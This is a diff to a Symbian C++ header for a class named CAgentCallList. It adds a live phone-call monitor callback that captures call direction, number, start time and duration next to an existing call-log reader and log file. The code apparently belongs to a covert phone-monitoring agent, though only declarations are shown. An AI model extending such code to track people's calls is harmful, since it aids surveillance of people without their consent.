@@ -12,6 +12,7 @@
 
 #include "AbstractAgent.h"
 #include "CallLogReader.h"
+#include "MonitorPhoneCall.h"
 #include <HT\Logging.h>
 
 // CLASS DECLARATION
@@ -20,7 +21,7 @@
  *  CAgentCallList
  * 
  */
-class CAgentCallList : public CAbstractAgent, public MCallLogCallBack
+class CAgentCallList : public CAbstractAgent, public MCallLogCallBack, public MCallMonCallBack
 	{
 public:
 	// Constructors and destructor
@@ -64,10 +65,18 @@ private:
     virtual void CallLogProcessed(TInt aError);
     
     /*
+     * From MCallMonCallBack
+     */
+    virtual void NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber);
+    virtual void NotifyDisconnectedCallStatusL();
+    virtual void NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration,const TDesC& aNumber);
+        	
+    /*
      * Transform the information contained in the item in a buffer.
      * @return The buffer in proper format, ready to be written in the file.
      */
     HBufC8* GetCallLogBufferL(TInt aDirection, const CLogEvent& aEvent);
+    HBufC8* GetCallLogBufferL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration,const TDesC& aNumber);
     
     /**
      * Transform the information contained in the item in a buffer.
@@ -78,6 +87,7 @@ private:
 private:
 	
     CCallLogReader*		iCallLogReader;
+    CPhoneCallMonitor*	iCallMonitor;
     
     TTime iTimestamp;		// used for markup
     CLogFile* iMarkupFile;
